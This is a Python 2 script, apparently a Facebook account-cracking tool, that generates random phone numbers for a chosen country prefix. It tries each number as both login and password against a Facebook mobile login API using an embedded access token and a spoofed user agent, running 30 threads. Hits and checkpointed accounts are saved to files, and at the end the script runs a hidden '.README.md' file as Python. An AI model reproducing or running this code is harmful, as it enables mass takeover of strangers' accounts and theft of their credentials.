
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(100000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 Lost.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo =  """\033[1;97m
   _____       _______ 
  / ____|   /\|__   __|
 | |       /  \  | |   
 | |      / /\ \ | |   
 | |____ / ____ \| |   
  \_____/_/    \_\_|   
                       

\033[97m________________________________________________________________________________
\033[97mAuther/ LOST

Telegram/ LO1STT

Telegram Chanell/ LO1STT1

Github/ https://github.com/LoSt-SoFtware
--------------------------------------------------------------------

"""
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    print 42 * '\x1b[1;97m='
    print '\x1b[1;97m[1]\x1b[1;97m  Kurdistan Crack Number'
    print '  '
    print '  '
    print '[0]\x1b[1;97m  Logout            '
    print 42 * '\x1b[1;97m='
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;91mSelect Option \x1b[1;93m>>>\x1b[1;95m  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\033[97m770-771-772-773-774-750-751-752-753-754-780-781-782-783-784'
        try:
            c = raw_input('\x1b[1;97m choose code  : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '2':
        os.system('clear')
        print logo
        print ''
        try:
            c = raw_input(' choose code  : ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '3':
        os.system('clear')
        print logo
        print '737, 706, 748, 783, 739, 759, 790'
        try:
            c = raw_input(' choose code  : ')
            k = '+44'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '4':
        os.system('clear')
        print logo
        print '954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578'
        try:
            c = raw_input(' choose code  : ')
            k = '+91'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '5':
        os.system('clear')
        print logo
        print '127, 179, 117, 853, 318, 219, 834, 186, 479, 113'
        try:
            c = raw_input(' choose code  : ')
            k = '+55'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '6':
        os.system('clear')
        print logo
        print '11, 12, 19, 16, 15, 13, 14, 18, 17'
        try:
            c = raw_input(' choose code  : ')
            k = '+81'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '7':
        os.system('clear')
        print logo
        print '1, 2, 3, 4, 5, 6, 7, 8, 9'
        try:
            c = raw_input(' choose code  : ')
            k = '+82'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '8':
        os.system('clear')
        print logo
        print '388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328'
        try:
            c = raw_input(' choose code  : ')
            k = '+39'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '9':
        os.system('clear')
        print logo
        print '60, 76, 73, 64, 69, 77, 65, 61, 75, 68'
        try:
            c = raw_input(' choose code  : ')
            k = '+34'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '10':
        os.system('clear')
        print logo
        print '66, 69, 78, 79, 60, 72, 67, 53, 51'
        try:
            c = raw_input(' choose code  : ')
            k = '+48'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '11':
        os.system('clear')
        print logo
        print '\x1b[1;93m01, ~to~~, 49'
        try:
            c = raw_input(' choose code  : ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '12':
        os.system('clear')
        print logo
        print '\x1b[1;93m81,83,85,84,89,'
        try:
            c = raw_input(' choose code  : ')
            k = '+1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '13':
        os.system('clear')
        print logo
        print '\x1b[1;93m901, 902, 903, 930, 933, 935, 936, 937, 938, 939'
        try:
            c = raw_input(' choose code  : ')
            k = '+98'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '14':
        os.system('clear')
        print logo
        print '\x1b[1;93m69,693,698,694,695'
        try:
            c = raw_input(' choose code  : ')
            k = '+3069'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '15':
        os.system('clear')
        print logo
        print '\x1b[1;96m070, 071, 079, 072, 073, 078, 077, 076, 074, 075'
        try:
            c = raw_input(' choose code  : ')
            k = '+93'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '16':
        os.system('clear')
        print logo
        print '\x1b[1;93m11, 21, 57, 41, 15, 52, 31, 23'
        try:
            c = raw_input(' choose code  : ')
            k = '+963'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '17':
        os.system('clear')
        print logo
        print '\x1b[1;96m322, 264, 416, 272, 472, 382, 312'
        try:
            c = raw_input(' choose code  : ')
            k = '+90'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '18':
        os.system('clear')
        print logo
        print '\x1b[1;96m079, 078, 073, 074'
        try:
            c = raw_input(' choose code  : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '19':
        os.system('clear')
        print logo
        print '\x1b[1;96m3, 2, 1, 4'
        try:
            c = raw_input(' choose code  : ')
            k = '+33'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '20':
        os.system('clear')
        print logo
        print '\x1b[1;93m67, 68, 69'
        try:
            c = raw_input(' choose code  : ')
            k = '+355'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '21':
        os.system('clear')
        print logo
        print '\x1b[1;96m49, 27, 43, 21,33, 49,26, 34,27,38, 29'
        try:
            c = raw_input(' choose code  : ')
            k = '+213'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '22':
        os.system('clear')
        print logo
        print '\x1b[1;95m8, 7, 3'
        try:
            c = raw_input(' choose code  : ')
            k = '+376'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '23':
        os.system('clear')
        print logo
        print '\x1b[1;95m22, 43, 23,53, 46,52, 38'
        try:
            c = raw_input(' choose code  : ')
            k = '+374'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '24':
        os.system('clear')
        print logo
        print '\x1b[1;95m366, 342, 362,365, 349'
        try:
            c = raw_input(' choose code  : ')
            k = '+995'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '25':
        os.system('clear')
        print logo
        print '\x1b[1;95m4, 5'
        try:
            c = raw_input(' choose code  : ')
            k = '+354'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '26':
        os.system('clear')
        print logo
        print '\x1b[1;95m139, 138, 137, 138'
        try:
            c = raw_input(' choose code  : ')
            k = '+86'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '27':
        os.system('clear')
        print logo
        print '\x1b[1;95m2, 7, 5'
        try:
            c = raw_input(' choose code  : ')
            k = '+975'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '28':
        os.system('clear')
        print logo
        print '\x1b[1;95m11'
        try:
            c = raw_input(' choose code  : ')
            k = '+976'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '29':
        os.system('clear')
        print logo
        print '\x1b[1;95m9, 24'
        try:
            c = raw_input(' choose code  : ')
            k = '+64'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '30':
        os.system('clear')
        print logo
        print '\x1b[1;95m 21, 41, 183, 81'
        try:
            c = raw_input(' choose code  : ')
            k = '+249'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == 'A':
        os.system('clear')
        print logo
        print '\x1b[1;95m 40, 41, 42, 43, 44, 45, 46, 47, 48'
        try:
            c = raw_input(' choose code  : ')
            k = '+92'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == 'B':
        os.system('clear')
        print logo
        print '\x1b[1;91m 10, 11, 12, 13, 14, 15, 16, 17, 18'
        try:
            c = raw_input(' choose code  : ')
            k = '+92'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == 'C':
        os.system('clear')
        print logo
        print '\x1b[1;91m 00, 01, 02, 03, 04, 05, 06'
        try:
            c = raw_input(' choose code  : ')
            k = '+92'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == 'D':
        os.system('clear')
        print logo
        print '\x1b[1;91m 16, 17, 18'
        try:
            c = raw_input(' choose code  : ')
            k = '+80'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == 'E':
        os.system('clear')
        print logo
        print '\x1b[1;91m 13, 14, 15,16, 18'
        try:
            c = raw_input(' choose code  : ')
            k = '+80'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == 'F':
        os.system('clear')
        print logo
        print '\x1b[1;91m 14, 19'
        try:
            c = raw_input(' choose code  : ')
            k = '+80'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '0':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.1)
    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m Please wait, process is running ...')
    time.sleep(0.1)
    psb('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    print 42 * '\x1b[1;91m='

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Successful]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[Checkpoint]\x1b[1;97m ' + k + c + user + ' >>> ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;91m='
    print '[\xe2\x9c\x93]\x1b[1;93m Process Has Been Completed ....'
    print '[\xe2\x9c\x93]\x1b[1;92m Total OK/\x1b[1;96mCP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 .README.md')


if __name__ == '__main__':
    menu()